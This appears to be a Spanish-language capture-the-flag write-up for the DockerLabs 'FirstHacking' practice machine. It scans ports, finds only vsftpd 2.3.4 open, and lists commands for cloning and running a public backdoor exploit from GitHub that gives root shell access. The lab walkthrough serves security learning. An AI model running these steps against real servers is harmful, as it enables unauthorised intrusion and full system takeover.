# Writeup-Maquina-FirstHacking
# [FirstHacking](https://dockerlabs.es/) | DOCKERLABS
<p>Haremos un PING para verificar la conexion</p>

<h2><b></b>Escaneo de Puertos</b></h2>
<img src="https://github.com/user-attachments/assets/3aebe9eb-2386-42ea-b777-5f915d359538">
<p>Veremos que unicamente tenemos el puerto 21 abierto</p>

<h2><b>Busqueda de Vulnerabilidad</b></h2>
<p>Como vimos al lanzar el escaneo de puertos tenemos la version del servicio en este caso es:</p>
<p>vsftpd 2.3.4</p>
<br>
<p>Por lo que buscaremos alguna vulnerabilidad para esta version</p>
<br>
<p>Buscando nos encontramos con este <a href="https://github.com/Hellsender01/vsftpd_2.3.4_Exploit">Exploit</a></p>

<h2><b>Utilizacion del Exploit</b></h2>
<p>Leeremos el exploit y haremos exactamente lo que nos dice</p>
<br>
<p>1. Instalamos la herramienta que nos pide: sudo python3 -m pip install pwntools</p>
<br>
<p>2. Clonamos el repositorio: git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git</p>
<br>
<p>3. Abriremos la carpeta que contiene el exploit: cd vsftpd_2.3.4_Exploit/</p>
<br>
<p>4. Modificamos su configuracion con el comando: chmod +x exploit.py</p>
<br>
<p>5. Lo ejecutamos: python3 exploit.py Target_IP</p>

<h2><b>Resultado</b></h2>
<p>Ya tenemos acceso a la maquina victima y somos usuario ROOT</p>
<img src="https://github.com/user-attachments/assets/d56c02f9-547c-47a0-9928-9e2d2285a1c5">